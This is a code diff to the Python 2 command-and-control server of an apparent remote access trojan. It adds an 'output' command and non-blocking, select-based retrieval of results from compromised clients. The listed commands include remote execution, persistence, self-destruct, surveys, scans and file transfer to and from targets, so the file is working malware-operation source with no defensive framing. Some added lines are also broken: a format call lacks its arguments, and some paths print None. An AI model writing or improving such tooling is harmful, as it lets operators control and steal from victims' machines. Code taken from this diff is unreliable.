@@ -12,6 +12,7 @@ import socket
 import sys
 import threading
 import time
+import select
 
 from core import common
 from core import crypto
@@ -32,6 +33,7 @@ BANNER = '''
 HELP_TEXT = '''
 client <id>         - Connect to a client.
 clients             - List connected clients.
+output              - Retrieve any prior output
 download <file>     - Download a file.
 execute <command>   - Execute a command on the target.
 help                - Show this help menu.
@@ -44,9 +46,10 @@ survey              - Run a system survey.
 unzip <file>        - Unzip a file.
 upload <file>       - Upload a file.
 wget <url>          - Download a file from the web.'''
+
 COMMANDS = [ 'client', 'clients', 'download', 'execute', 'help', 'kill',
-             'persistence', 'quit', 'scan', 'selfdestruct', 'survey',
-             'unzip', 'upload', 'wget' ]
+             'output', 'persistence', 'quit', 'scan', 'selfdestruct',
+             'survey', 'unzip', 'upload', 'wget' ]
 
 
 class Server(threading.Thread):
@@ -91,6 +94,14 @@ class ClientConnection(common.Client):
             print 'Error: Client not connected.'
             return
 
+        readable, _, _ = select.select([self.conn], [], [], 0)
+        if readable:
+            print "prior output"
+            print "---------------"
+            print self.recv(0)
+            print ""
+
+
         # seperate prompt into command and action
         cmd, _, action = prompt.partition(' ')
 
@@ -105,7 +116,6 @@ class ClientConnection(common.Client):
 
         # send prompt to client
         self.sendGCM(prompt)
-        self.conn.settimeout(1)
 
         # kill client connection
         if cmd == 'kill':
@@ -126,8 +136,26 @@ class ClientConnection(common.Client):
         # results of execute, persistence, scan, survey, unzip, or wget
         elif cmd in ['execute', 'persistence', 'scan', 'survey', 'unzip', 'wget']:
             print 'Running {}...'.format(cmd)
-            recv_data = self.recvGCM().rstrip()
-            print recv_data
+            print self.recv()
+
+    def recv(self, timeout=10):
+        readable, _, exceptional  = select.select([self.conn], [], [self.conn], timeout)
+        if self.conn in exceptional:
+            print "An error occured on the socket."
+            print "please write more code to determine what happened."
+
+        elif self.conn in readable:
+            try:
+                recv_data = self.recvGCM().rstrip()
+                return recv_data
+
+            except crypto.InvalidTagException:
+                print "there was a tag error. response is being discarded"
+                print "IV: {}\tTag: {}".format()
+
+        else:
+            print "There is no output currently available."
+            print "Call 'output' later to retrieve results."
 
 
 def get_parser():
@@ -200,8 +228,11 @@ def main():
             for k in server.get_clients():
                 print '{:>2} - {}'.format(k.uid, k.addr[0])
 
+        elif cmd == 'output':
+            client.recv(0)
+
         # continue loop for above commands
-        if cmd in ['client', 'clients', 'help', 'quit']:
+        if cmd in ['client', 'clients', 'help', 'quit', 'output']:
             continue
 
         # require client id
